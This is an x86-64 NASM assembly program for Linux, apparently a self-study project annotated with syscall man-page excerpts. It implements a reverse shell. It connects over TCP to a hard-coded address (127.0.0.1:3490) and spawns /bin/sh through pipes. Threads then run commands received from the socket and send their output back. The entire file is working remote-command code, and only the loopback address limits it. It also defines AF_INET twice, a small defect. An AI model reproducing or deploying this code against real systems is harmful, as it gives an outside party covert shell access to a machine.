BITS 64

%include "inc64.inc"
%include "thread.inc"

section .text
    global _start

_start:
    push rbp
    mov rbp, rsp
    sub rsp, 0x18e

    mov byte[rbp + available.available], 0 ; false

    ;               $rdi       $rsi      $rdx
    ;int socket(int domain, int type, int protocol);
    ;   
    ; Return Value:
    ; On success, a file descriptor for the new socket is returned.  On
    ; error, -1 is returned, and errno is set to indicate the error.
    mov rdi, AF_INET ; int domain
    mov rsi, SOCK_STREAM ; int type
    mov rdx, 0 ; int protocol
    mov rax, SYS_SOCKET ; socket
    syscall ; socket(AF_INET, SOCK_STREAM, 0);
    
    ; if(socket == -1)
    cmp eax, -1
    jle _sockFailed
    mov dword[rbp + socket.socketfd], eax

    ; their_addr.sin_family = AF_INET;   /* host byte order */
    ; their_addr.sin_port = htons(PORT); /* short, network byte order */
    ; their_addr.sin_addr = *((struct in_addr *)he->h_addr);
    ; bzero(&(their_addr.sin_zero), 8); /* zero the rest of the struct */
    mov word [rbp + sockaddr_in.sin_family], AF_INET ; host byte order
    mov word [rbp + sockaddr_in.sin_port], 0xa20d ; 3490 PORT
    mov dword [rbp + sockaddr_in.sin_addr], 0x100007f ; 127.0.0.1
    mov qword [rbp + sockaddr_in.sin_zero], 0


    ;                 $rdi                        $rsi               $rdx
    ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ;
    ; Return Value:
    ; If  the  connection or binding succeeds, zero is returned.  On error, -1 is
    ;   returned, and errno is set appropriately.
    mov edi, dword[rbp + socket.socketfd] ; int sockfd
    lea rsi, qword[rbp + sockaddr_in] ; const struct sockaddr *addr
    mov rdx, 0x10 ; sizeof(const struct sockaddr)
    mov rax, SYS_CONNECT ; connect
    syscall ; connect(sockfd, addr, 16);
    cmp eax, -1
    jle _connectFailed
    ;
    ; excute shell
    ;
    ;               $rdi
    ; int pipe(int pipefd[2]);
    ;
    ; Return Value:
    ; On  success,  zero  is returned.  On error, -1 is returned, 
    ; errno is set appropriately, and pipefd is left unchanged
    ;
    lea rdi, [rbp + fd1]
    mov rax, SYS_PIPE
    syscall
    cmp eax, 0
    jne _pipeFailed

    lea rdi, [rbp + fd2]
    mov rax, SYS_PIPE
    syscall
    cmp eax, 0
    jne _pipeFailed

     ;
    ; pid_t fork(void);
    ;
    ; Return Value:
    ; On  success,  the PID of the child process is returned in the parent, 
    ; and 0 is returned in the child.  On failure, -1 is returned in the parent, 
    ; no child process  is  created, and errno is set appropriately.
    ;
    mov rax, SYS_FORK
    syscall
    cmp eax, -1
    je _forkFailed
    cmp eax, 0
    jne _parent
_child:
    ;
    ; int close(int fd);
    ;
    ; close()  returns zero on success.  On error, -1 is returned, 
    ; and errno is set appropriately
    ;
    mov edi, dword[rbp + fd1.write]
    mov rax, SYS_CLOSE
    syscall
    cmp eax, 0
    jne _closeFailed

    mov edi, dword[rbp + fd2.read]
    mov rax, SYS_CLOSE
    syscall
    cmp eax, 0
    jne _closeFailed

    mov edi, dword[rbp + fd2.write]
    cmp edi, STDOUT_FILENO; stdout -> fd2[1](write)
    je _job1
    ;               $rdi       $rsi
    ; int dup2(int oldfd, int newfd);
    ;
    ; Return Value:
    ; On success, these system calls return the new file descriptor.  
    ; On  error,  -1  is  returned, and errno is set appropriately.
    ;
    mov edi, dword[rbp + fd2.write]
    mov esi, STDOUT_FILENO
    mov rax, SYS_DUP2
    syscall
    cmp eax, -1
    je _dup2Failed
    ;
    ; int close(int fd);
    ;
    ; close()  returns zero on success.  On error, -1 is returned, 
    ; and errno is set appropriately
    ;
    mov edi, dword[rbp + fd2.write]
    mov rax, SYS_CLOSE
    syscall
    cmp eax, 0
    jne _closeFailed

_job1:
    mov edi, dword[rbp + fd1.read] 
    cmp edi, STDIN_FILENO ; stdin -> fd1[0](read)
    je _job2
    mov edi, dword[rbp + fd1.read]
    mov esi, STDIN_FILENO
    mov rax, SYS_DUP2
    syscall
    cmp eax, -1
    je _dup2Failed

    mov edi, dword[rbp + fd1.read]
    mov rax, SYS_CLOSE
    syscall
    cmp eax, 0
    jne _closeFailed
_job2:
    ;execve
    ;
    ; int execve(const char *pathname, char *const argv[],
    ;              char *const envp[]);
    ; Return Value :
    ; On  success, execve() does not return, on error -1 is returned, 
    ; and errno is set appropriately.
    mov qword[rbp + newargv.sh], binsh
    mov qword[rbp + newargv.null], 0
    mov qword[rbp + newenviron.null], 0
    mov rdi, binsh
    lea rsi, [rbp + newargv]
    lea rdx, [rbp + newenviron]
    mov rax, SYS_EXECVE
    syscall
    exit

_parent:
    ;
    ; int close(int fd);
    ;
    ; close()  returns zero on success.  On error, -1 is returned, 
    ; and errno is set appropriately
    ;
    mov dword[rbp + pid.pid], eax ; save pid
    mov edi, dword[rbp + fd1.read]
    mov rax, SYS_CLOSE
    syscall
    cmp eax, 0
    jne _closeFailed

    mov edi, dword[rbp + fd2.write]
    mov rax, SYS_CLOSE
    syscall
    cmp eax, 0
    jne _closeFailed
    mov rdi, readThread
    call thread_create
    mov rdi, _recvloop
    call thread_create
    jmp _mainThread

_recvloop:
    ;                      $rdi        $rsi        $rdx      $r10    
    ;ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
    ;                                     $r8                 $r9
    ;                   struct sockaddr *src_addr, socklen_t *addrlen);
    ; Return Value:
    ; These  calls  return  the number of bytes received, or -1 if an error occurred.  In the
    ;   event of an error, errno is set to indicate the error.
    ;   When a stream socket peer has performed an orderly shutdown, the return value will be 0
    ;   (the traditional "end-of-file" return).
    ;   Datagram  sockets in various domains (e.g., the UNIX and Internet domains) permit zero-
    ;   length datagrams.  When such a datagram is received, the return value is 0.
    ;   The value 0 may also be returned if the requested number of bytes  to  receive  from  a
    ;   stream socket was 0.
    mov edi, dword[rbp + socket.socketfd] ; sockfd
    lea rsi, dword[rbp + socket.buf] ; buf
    mov rdx, MAXDATASIZE ; len
    mov r10, 0 ; flags
    mov r8, 0 ; NULL
    mov r9, 0 ; NULL
    mov rax, SYS_RECVFROM ; recvfrom
    syscall ; recvfrom(sockfd, buf, 100, 0, 0, 0);

    cmp eax, 0
    jl _recvfromFailed
    je _exit; shutdown or received from stream socket was 0

    mov dword[rbp + socket.len], eax ; save to length
    add dword[rbp + socket.len], 1
    mov byte[rbp + socket.buf + rax ], 10 ; buf[numbytes] = '\n';

    ;ssize_t write(int fd, const void *buf, size_t count);
    ;
    ; Return Value :
    ; On success, the number of bytes written is returned.  On error,
    ; -1 is returned, and errno is set to indicate the error.

    ; Input Command
    mov edi, dword[rbp + fd1.write]
    lea rsi, [rbp + socket.buf]
    mov edx, dword[rbp +socket.len] ;length
    mov rax, SYS_WRITE ;write
    syscall
    cmp eax, 0
    jl _writeFailed

    ;exit String Check Routine
    lea rax, [rbp + socket.buf] ; rax = &buf
    mov rcx, -1 ; index
_strcheck:
    add rcx, 1
    cmp rcx, exitlen
    je _pipeexit
    mov al, byte[rbp + socket.buf + rcx] ; buf[rcx]
    mov dl, byte[exitString + rcx] ; "e", "x", "i", "t", "\n"
    cmp al, dl
    je _strcheck
    jmp _recvloop

_mainThread:
_readflag:
    mov al, byte[rbp + available.available] ; read flag
    cmp al, 0
    je _readflag
    ;                   $rdi               $rsi         $rdx      $r10
    ;ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,
    ;                                           $r8                    $r9
    ;                  const struct sockaddr *dest_addr, socklen_t addrlen);
    ; Return Value:
    ; On success, these calls return the number of bytes sent.  
    ; On error, -1 is returned, and errno is set appropriately.
    mov edi, dword[rbp + socket.socketfd] ; sockfd
    lea rsi, [rbp + commandOutput] ; buf
    mov edx, MAXDATASIZE; len
    mov r10, 0 ;
    mov r8, 0 ;
    mov r9, 0 ; because it is already connected
    mov rax, SYS_SENDTO
    syscall
    cmp eax, -1
    je _sendtoFailed
    mov byte[rbp + available.available], 0
    mov rcx, -1
_zero:
    add rcx, 1
    cmp rcx, MAXDATASIZE
    je _readflag
    mov byte[rbp + commandOutput + rcx], 0
    jmp _zero





readThread:
    ;ssize_t read(int fd, void *buf, size_t count);
    ;
    ; On  success, the number of bytes read is returned (zero indicates end of file), and the
    ;   file position is advanced by this number.  It is not an error if this number is smaller
    ;   than the number of bytes requested; this may happen for example because fewer bytes are
    ;   actually available right now (maybe because we were close to end-of-file, or because we
    ;   are  reading  from  a pipe, or from a terminal), or because read() was interrupted by a
    ;   signal.  See also NOTES.
    ;   On error, -1 is returned, and errno is set appropriately.  In this case, it is left un‐
    ;   specified whether the file position (if any) changes.
    mov edi, dword[rbp + fd2.read]
    lea rsi, [rbp + commandOutput]
    mov rdx, MAXDATASIZE
    mov rax, SYS_READ
    syscall
    cmp eax, 0
    jl _readFailed
    mov byte[rbp + available.available], 1
    jmp readThread 



_pipeexit:
    ;
    ; int close(int fd);
    ;
    ; close()  returns zero on success.  On error, -1 is returned, 
    ; and errno is set appropriately
    ;
    mov edi, dword[rbp + fd1.write]
    mov rax, SYS_CLOSE
    syscall
    cmp eax, 0
    jne _closeFailed

    mov edi, dword[rbp + fd2.read]
    mov rax, SYS_CLOSE
    syscall
    cmp eax, 0
    jne _closeFailed



_exit:
    ;              $rdi
    ; int close(int fd);
    ; Return Value:
    ; close() returns zero on success.  On error, -1 is returned, 
    ; and errno is set appropriately.
    mov edi, dword[rbp + socket.socketfd] ; sockfd
    mov rax, SYS_CLOSE
    syscall
    cmp eax, -1
    je _closeFailed

    ;                       $rdi     $rsi            $rdx         $r10
    ; int waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options);
    ;
    ; Return Value:
    ; waitid():  returns 0 on success or if WNOHANG was specified and 
    ; no child(ren) specified by id has yet changed state; on error, -1 is returned.   
    mov edi, P_PID
    mov esi, dword[rbp + pid.pid]
    lea rdx, [rbp + siginfo_t.siginfo]
    mov r10, 0x6;WEXITED | WSTOPPED
    mov rax, SYS_WAITID
    syscall
    cmp eax, 0 
    jne _waitidFailed
    mov rsp, rbp
    pop rbp
    exit




;--------------------------------Thread---------------------------------------------
;; long thread_create(void (*)(void))
thread_create:
    ;                          $rdi             $rsi           
	; long clone(unsigned long flags, void *child_stack,
	;			  $rdx        $r10					$r8
    ;       void *ptid, void *ctid, struct pt_regs *regs);
	; pointer is always indicate Low Address
    ;  ┌────────────────┐            
	;  │ 32	 33	 34	 35 │
	;  │ 28	 29	 30	 31 │
	;  │ 24	 25	 26	 27 │
	;  │ 20	 21	 22	 23 │
	;  │ 16	 17	 18	 19 │
	;  │ 12	 13	 14	 15 │
	;  │ 8   9	 10	 11 │
	;  │ 4   5   6   7  │
	;  │ 0 	 1	 2	 3  │
	;  └────────────────┘
	;
	;				 
	;            				 ┌────────────────┐						       
	;         Main Thread rsp--> │    original    │	                           Main Thread ret -> original return Address
	;      	  					 │ return Address │			
	;      		 				 ┈ ┈ ┈ ┈ ┈ ┈ ┈ 						      
	;            				 │    thread_fn   │          sys_clone()  
	;            				 │     Address    │                       
	;      		 				 ┈ ┈ ┈ ┈ ┈ ┈ ┈ 						     
	;    		 				 │................│                     
	;         New Thread rsp-->  │    thread_fn   │						      New Thread ret -> thread_fn Address
	;     Stack Size = 12        │     Address    │		 				 
	; $rax(End Point Address)--> │ 8   9   10  11 │					     
	;         				     │ 4   5   6   7  │                      
	;         				     │ 0   1   2   3  │                      
	;         				     └────────────────┘                            

	push rdi ;thread_fn
	call stack_create
	lea rsi, [rax + STACK_SIZE - 8] ;thread function Pointer
	pop qword [rsi] ; thread function Pointer->thread_fn
	mov rdi, THREAD_FLAGS ; flags
	mov rax, SYS_clone
	syscall ;여기서 thread 생성되며 실행이 계속됨
	ret

;; void *stack_create(void)
stack_create:
    ;                  $rdi          $rsi       $rdx      $r10
    ; void *mmap(void *addr, size_t length, int prot, int flags,
    ;                  $r8          $r9
    ;              int fd, off_t offset);
    ; Return Value:
    ; On success, mmap() returns a pointer to the mapped area.  On
    ;   error, the value MAP_FAILED (that is, (void *) -1) is returned,
    ;   and errno is set to indicate the error.
	mov rdi, 0
	mov rsi, STACK_SIZE
	mov rdx, PROT_WRITE | PROT_READ
	mov r10, MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN
	mov r8, -1
	mov r9, 0
	mov rax, SYS_mmap
	syscall
	ret
;--------------------------------Thread---------------------------------------------



;--------------------------------Data Structure-------------------------------------

; Data Structure
struc sockaddr_in, -0x10 ;16 Last Size + Current Size
    .sin_family:    resb 2  ;2bytes
    .sin_port:      resb 2  ;2bytes
    .sin_addr:      resb 4  ;4bytes
    .sin_zero:      resb 8  ;8bytes
endstruc

struc pid, -0x14 ;20 Last Size + Current Size
    .pid resb 4 ;4bytes
endstruc

struc socket, -0x80 ;128 Last Size + Current Size
    .socketfd:       resb 4 ;4bytes
    .len:            resb 4 ;4btres
    .buf:            resb MAXDATASIZE ;100bytes buf
endstruc

struc commandOutput, -0xe4 ;228 Last Size + Current Size
    .commandOutput:  resb MAXDATASIZE ;100bytes commandOutput
endstruc

struc siginfo_t, -0x164 ;356 Last Size + Current Size
    .siginfo: resb 128 ; 128bytes
endstruc

struc fd1, -0x16c ;364 Last Size + Current Size
    .read: resb 4 ;4bytes
    .write: resb 4 ;4bytes
endstruc

struc fd2, -0x174 ;372 Last Size + Current Size
    .read: resb 4 ;4bytes
    .write: resb 4 ;4bytes
endstruc

struc newargv, -0x184 ; 388 Last Size + Current Size
    .sh: resb   8 ;8bytes
    .null: resb 8 ;8bytes
endstruc

struc newenviron, -0x18c ; 396 Last Size + Current Size
    .null resb 8 ;8bytes
endstruc

struc c, -0x18d ; 397 Last Size + Current Size
    .char: resb 1 ;1bytes
endstruc

struc available, -0x18e  
    .available: resb 1;1bytes
endstruc

;--------------------------------Data Structure-------------------------------------


;--------------------------------Error Handling Routine-----------------------------
_sockFailed:
    print socketError
    mov rsp, rbp
    pop rbp
    exit
_closeFailed:
    print closeError
    mov rsp, rbp
    pop rbp
    exit
_connectFailed:
    print connectError
    mov rsp, rbp
    pop rbp
    exit
_recvfromFailed:
    print recvfromError
    mov rsp, rbp
    pop rbp
    exit
_sendtoFailed:
    print sendtoError
    mov rsp, rbp
    pop rbp
    exit
_pipeFailed:
    print pipeError
    mov rsp, rbp
    pop rbp
    exit
_forkFailed:
    print forkError
    mov rsp, rbp
    pop rbp
    exit
_waitidFailed:
    print waitidError
    mov rsp, rbp
    pop rbp
    exit
_dup2Failed:
    print dup2Error
    mov rsp, rbp
    pop rbp
    exit

_readFailed:
    print readError
    mov rsp, rbp
    pop rbp
    exit

_writeFailed:
    print writeError
    mov rsp, rbp
    pop rbp
    exit

; Error Message
socketError: db "Socket Error",33,10,0
closeError: db "close Error",33,10,0
connectError: db "connect Error",33,10,0
recvfromError: db "recvfrom Error",33,10,0
sendtoError: db "sendto Error",33,10,0
pipeError: db "pipe Error",33,10,0
forkError: db "fork Error",33,10,0
waitidError: db "waitid Error",33,10,0
dup2Error: db "dup Error",33,10,0
writeError: db "write Error",33,10,0
readError: db "read Error",33,10,0

;--------------------------------Error Handling Routine-----------------------------


;sh
binsh: db "/bin/sh",0

; buffer SIze
MAXDATASIZE equ 100

; For socket
SOCK_STREAM equ 1
AF_INET equ 2
AF_INET equ 2

; exit String
exitString: db "exit",10
exitlen equ 5